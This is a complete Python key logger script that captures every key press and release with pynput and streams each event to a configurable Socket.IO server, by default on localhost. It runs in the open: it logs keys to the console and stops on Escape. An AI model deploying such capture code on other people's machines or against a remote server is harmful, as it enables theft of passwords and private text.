#!/usr/bin/env python3
"""
Key Logger that captures keystrokes and sends them to a Flask server via WebSocket
"""
import time
import json
import logging
from datetime import datetime
from pynput import keyboard
import socketio

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class KeyLogger:
    def __init__(self, server_url='http://localhost:5001', filter_key_repeat=True, repeat_threshold=0.05):
        self.server_url = server_url
        self.sio = socketio.Client()
        self.filter_key_repeat = filter_key_repeat
        self.repeat_threshold = repeat_threshold  # Time in seconds to filter repeats
        self.last_key_times = {}  # Track when each key was last pressed
        self.pressed_keys = set()  # Track currently pressed keys
        self.setup_socketio_events()
        self.connect_to_server()
        
    def setup_socketio_events(self):
        """Setup Socket.IO event handlers"""
        @self.sio.event
        def connect():
            logger.info("Connected to Flask server")
            
        @self.sio.event
        def disconnect():
            logger.info("Disconnected from Flask server")
            
        @self.sio.event
        def connect_error(data):
            logger.error(f"Connection failed: {data}")
    
    def connect_to_server(self):
        """Connect to the Flask server"""
        try:
            self.sio.connect(self.server_url)
            logger.info(f"Connected to server at {self.server_url}")
        except Exception as e:
            logger.error(f"Failed to connect to server: {e}")
            
    def send_keystroke(self, key_data):
        """Send keystroke data to the server"""
        try:
            if self.sio.connected:
                self.sio.emit('keystroke', key_data)
            else:
                logger.warning("Not connected to server, attempting to reconnect...")
                self.connect_to_server()
        except Exception as e:
            logger.error(f"Failed to send keystroke: {e}")
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            current_time = time.time()
            timestamp = datetime.now().isoformat()
            
            # Handle different key types
            if hasattr(key, 'char') and key.char is not None:
                # Regular character keys
                key_char = key.char
                key_name = key_char
            else:
                # Special keys (ctrl, alt, space, etc.)
                key_char = None
                key_name = str(key).replace('Key.', '')
            
            # Create a unique key identifier
            key_id = str(key)
            
            # Filter key repeat if enabled
            if self.filter_key_repeat:
                # Check if this is a key repeat (same key pressed recently)
                if key_id in self.last_key_times:
                    time_since_last = current_time - self.last_key_times[key_id]
                    if time_since_last < self.repeat_threshold and key_id in self.pressed_keys:
                        # This is likely a key repeat, skip it
                        return
                
                # Update tracking
                self.last_key_times[key_id] = current_time
                self.pressed_keys.add(key_id)
            
            key_data = {
                'timestamp': timestamp,
                'event': 'press',
                'key_char': key_char,
                'key_name': key_name,
                'key_code': str(key),
                'is_repeat': False
            }
            
            logger.info(f"Key pressed: {key_name}")
            self.send_keystroke(key_data)
            
        except Exception as e:
            logger.error(f"Error processing key press: {e}")
    
    def on_key_release(self, key):
        """Handle key release events"""
        try:
            timestamp = datetime.now().isoformat()
            
            # Handle different key types
            if hasattr(key, 'char') and key.char is not None:
                key_char = key.char
                key_name = key_char
            else:
                key_char = None
                key_name = str(key).replace('Key.', '')
            
            key_data = {
                'timestamp': timestamp,
                'event': 'release',
                'key_char': key_char,
                'key_name': key_name,
                'key_code': str(key)
            }
            
            self.send_keystroke(key_data)
            
            if key == keyboard.Key.esc:
                logger.info("Escape key pressed, stopping key logger...")
                return False
                
        except Exception as e:
            logger.error(f"Error processing key release: {e}")
    
    def start_logging(self):
        """Start the key logging process"""
        logger.info("Starting key logger...")
        logger.info("Press Escape to stop logging")
        
        try:
            with keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release
            ) as listener:
                listener.join()
        except PermissionError as e:
            logger.error("Permission denied - accessibility permissions required")
            logger.error("Please grant accessibility permissions to your terminal in System Preferences")
            raise
        except Exception as e:
            logger.error(f"Error starting key listener: {e}")
            # Check if it's the threading issue
            if "'_thread._ThreadHandle' object is not callable" in str(e):
                logger.error("This appears to be a threading compatibility issue.")
                logger.error("Try updating pynput: pip install --upgrade pynput")
            raise
        finally:
            if self.sio.connected:
                self.sio.disconnect()
            logger.info("Key logger stopped")

def main():
    """Main function to run the key logger"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Key Logger with WebSocket streaming')
    parser.add_argument(
        '--server', 
        default='http://localhost:5001',
        help='Flask server URL (default: http://localhost:5001)'
    )
    
    args = parser.parse_args()
    
    logger.info("=== Key Logger Starting ===")
    logger.info(f"Server URL: {args.server}")
    
    try:
        key_logger = KeyLogger(server_url=args.server)
        key_logger.start_logging()
    except KeyboardInterrupt:
        logger.info("Key logger interrupted by user")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")

if __name__ == "__main__":
    main()
